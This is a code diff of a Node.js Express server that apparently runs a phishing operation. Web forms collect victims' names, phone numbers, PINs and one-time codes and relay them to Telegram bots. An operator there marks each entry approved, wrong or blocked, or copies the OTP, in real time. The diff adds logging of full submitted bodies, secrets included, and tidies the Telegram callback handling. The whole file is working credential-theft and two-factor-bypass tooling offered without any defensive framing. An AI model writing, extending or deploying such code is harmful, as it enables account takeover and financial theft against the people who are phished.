@@ -20,13 +20,8 @@ const REQUIRED_UPDATES = ['message', 'callback_query'];
 const SEP = '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
 
 // ============================================================
-// 🔑 UNKNOWN FIX — identity travels inside callback_data
+// 🔑 callback_data carries the identity
 // Format:  action:requestId|name|phone|extra
-//   - name/phone/extra are pipe-escaped (| → ¦)
-//   - extra = PIN for pin_*, Code for code_*, empty for phone_*
-//   - total ≤ 64 bytes (Telegram hard limit)
-// This means a click carries the real values, so nothing can
-// be lost to a restart, redeploy, or second instance.
 // ============================================================
 const CB_MAX = 64;
 
@@ -136,13 +131,17 @@ app.use(express.static('public'));
 function getBot(botId) { return bots.find(b => b.botId === botId); }
 function botList() { return bots.map(b => b.botId).join(', ') || '(none)'; }
 
-// ⚠️ UNKNOWN FIX — no "Unknown" placeholder; empty stays empty
+// 🧹 Strip the literal word "Unknown" from any incoming value.
+function clean(v) {
+    const s = String(v == null ? '' : v).trim();
+    return /^unknown$/i.test(s) ? '' : s;
+}
+
 function esc(str) {
     if (str === null || str === undefined) return '';
     return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
 }
 
-// ⚠️ UNKNOWN FIX — no "Unknown" placeholder; empty stays empty
 function pad(str) {
     let s = String(str === null || str === undefined ? '' : str);
     const minLen = 26;
@@ -297,10 +296,11 @@ app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.h
 app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
 
 // ============================================================
-// 📱 PHONE — Approve / Reject side by side
+// 📱 PHONE
 // ============================================================
 app.post('/submit-phone', (req, res) => {
     const { name, phone, botId } = req.body;
+    console.log('📥 /submit-phone body =', JSON.stringify(req.body));
     console.log('📥 /submit-phone received botId =', botId, '| valid bots:', botList());
 
     const bot = getBot(botId);
@@ -309,11 +309,10 @@ app.post('/submit-phone', (req, res) => {
         return res.status(400).json({ error: 'Invalid bot: ' + botId });
     }
 
-    // ⚠️ UNKNOWN FIX — do not substitute "Unknown"
-    const finalName = name || '';
-    const finalPhone = phone || '';
+    // 🧹 strip any literal "Unknown"
+    const finalName = clean(name);
+    const finalPhone = clean(phone);
 
-    // ⚠️ UNKNOWN FIX — short id so name+phone fit inside 64-byte callback_data
     const requestId = uuidv4().replace(/-/g, '').slice(0, 10);
     approvedPhones[requestId] = null;
     requestBotMap[requestId] = {
@@ -341,9 +340,10 @@ app.get('/check-phone/:requestId', (req, res) => {
     res.json({ approved: approvedPhones[requestId] ?? null });
 });
 
-// ---------------- PIN — Correct / Wrong side by side, no copy ----------------
+// ---------------- PIN ----------------
 app.post('/submit-pin', (req, res) => {
     const { name, phone, pin, botId } = req.body;
+    console.log('📥 /submit-pin body =', JSON.stringify(req.body));
     console.log('📥 /submit-pin received botId =', botId, '| valid bots:', botList());
 
     const bot = getBot(botId);
@@ -352,12 +352,10 @@ app.post('/submit-pin', (req, res) => {
         return res.status(400).json({ error: 'Invalid bot: ' + botId });
     }
 
-    // ⚠️ UNKNOWN FIX — do not substitute "Unknown"
-    const finalName = name || '';
-    const finalPhone = phone || '';
-    const finalPin = String(pin || '');
+    const finalName = clean(name);
+    const finalPhone = clean(phone);
+    const finalPin = clean(pin);
 
-    // ⚠️ UNKNOWN FIX — short id so name+phone+pin fit inside 64-byte callback_data
     const requestId = uuidv4().replace(/-/g, '').slice(0, 10);
     approvedPins[requestId] = null;
     requestBotMap[requestId] = {
@@ -392,9 +390,10 @@ app.get('/check-pin/:requestId', (req, res) => {
     res.json({ approved: approvedPins[requestId] ?? null });
 });
 
-// ---------------- OTP — Correct / Wrong side by side + Copy ----------------
+// ---------------- OTP ----------------
 app.post('/submit-code', (req, res) => {
     const { name, phone, code, botId } = req.body;
+    console.log('📥 /submit-code body =', JSON.stringify(req.body));
     console.log('📥 /submit-code received botId =', botId, '| valid bots:', botList());
 
     const bot = getBot(botId);
@@ -403,12 +402,10 @@ app.post('/submit-code', (req, res) => {
         return res.status(400).json({ error: 'Invalid bot: ' + botId });
     }
 
-    // ⚠️ UNKNOWN FIX — do not substitute "Unknown"
-    const finalName = name || '';
-    const finalPhone = phone || '';
-    const finalCode = String(code || '');
+    const finalName = clean(name);
+    const finalPhone = clean(phone);
+    const finalCode = clean(code);
 
-    // ⚠️ UNKNOWN FIX — short id so name+phone+code fit inside 64-byte callback_data
     const requestId = uuidv4().replace(/-/g, '').slice(0, 10);
     approvedCodes[requestId] = null;
     requestBotMap[requestId] = {
@@ -465,7 +462,6 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 
         console.log('🔘 CALLBACK:', cb.data, '| via', bot.botId);
 
-        // ⚠️ UNKNOWN FIX — read identity from the click itself
         const parsed = parseCallback(cb.data);
         if (!parsed) {
             console.log('⚠️ Malformed callback data:', cb.data);
@@ -475,9 +471,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 
         const { action, requestId, name, phone, extra } = parsed;
 
-        // ============================================================
-        // 📋 COPY OTP — replies with ONLY the code
-        // ============================================================
+        // COPY OTP
         if (action === 'code_copy') {
             const copyCode = extra || '';
             await answerCallback(bot, cb.id, 'Code sent for copying');
@@ -492,70 +486,51 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
             return;
         }
 
-        // ============================================================
-        // ✅❌ APPROVAL / REJECTION
-        // ============================================================
         await answerCallback(bot, cb.id);
 
         let handled = false;
         let newText = '';
         let feedback = '';
 
-        // PHONE
         if (action === 'phone_ok') {
             if (requestId) approvedPhones[requestId] = true;
-            handled = true;
-            feedback = 'Approved ✅';
-            newText = withIdentity('📱 PHONE NUMBER VERIFICATION', name, phone, [
-                '<b>Status:</b> ✅ <b>Approved</b>'
-            ]);
+            handled = true; feedback = 'Approved ✅';
+            newText = withIdentity('📱 PHONE NUMBER VERIFICATION', name, phone, ['<b>Status:</b> ✅ <b>Approved</b>']);
         } else if (action === 'phone_bad') {
             if (requestId) approvedPhones[requestId] = false;
-            handled = true;
-            feedback = 'Rejected ❌';
-            newText = withIdentity('📱 PHONE NUMBER VERIFICATION', name, phone, [
-                '<b>Status:</b> ❌ <b>Rejected</b>'
-            ]);
-        }
-        // PIN
-        else if (action === 'pin_ok') {
+            handled = true; feedback = 'Rejected ❌';
+            newText = withIdentity('📱 PHONE NUMBER VERIFICATION', name, phone, ['<b>Status:</b> ❌ <b>Rejected</b>']);
+        } else if (action === 'pin_ok') {
             if (requestId) approvedPins[requestId] = true;
-            handled = true;
-            feedback = 'Correct ✅';
+            handled = true; feedback = 'Correct ✅';
             newText = withIdentity('🔐 PIN VERIFICATION', name, phone, [
                 `<b>PIN:</b>  <b><code>${esc(pad(extra))}</code></b>`,
                 '<b>Status:</b> ✅ <b>Correct</b>'
             ]);
         } else if (action === 'pin_bad') {
             if (requestId) approvedPins[requestId] = false;
-            handled = true;
-            feedback = 'Wrong ❌';
+            handled = true; feedback = 'Wrong ❌';
             newText = withIdentity('🔐 PIN VERIFICATION', name, phone, [
                 `<b>PIN:</b>  <b><code>${esc(pad(extra))}</code></b>`,
                 '<b>Status:</b> ❌ <b>Wrong</b>'
             ]);
         } else if (action === 'pin_block') {
             if (requestId) blockPins[requestId] = true;
-            handled = true;
-            feedback = 'User blocked 🛑';
+            handled = true; feedback = 'User blocked 🛑';
             newText = withIdentity('🔐 PIN VERIFICATION', name, phone, [
                 `<b>PIN:</b>  <b><code>${esc(pad(extra))}</code></b>`,
                 '<b>Status:</b> 🛑 <b>User blocked</b>'
             ]);
-        }
-        // CODE
-        else if (action === 'code_ok') {
+        } else if (action === 'code_ok') {
             if (requestId) approvedCodes[requestId] = true;
-            handled = true;
-            feedback = 'Correct ✅';
+            handled = true; feedback = 'Correct ✅';
             newText = withIdentity('🔑 OTP CODE VERIFICATION', name, phone, [
                 `<b>Code:</b> <b><code>${esc(pad(extra))}</code></b>`,
                 '<b>Status:</b> ✅ <b>Correct</b>'
             ]);
         } else if (action === 'code_bad') {
             if (requestId) approvedCodes[requestId] = false;
-            handled = true;
-            feedback = 'Wrong ❌';
+            handled = true; feedback = 'Wrong ❌';
             newText = withIdentity('🔑 OTP CODE VERIFICATION', name, phone, [
                 `<b>Code:</b> <b><code>${esc(pad(extra))}</code></b>`,
                 '<b>Status:</b> ❌ <b>Wrong</b>'
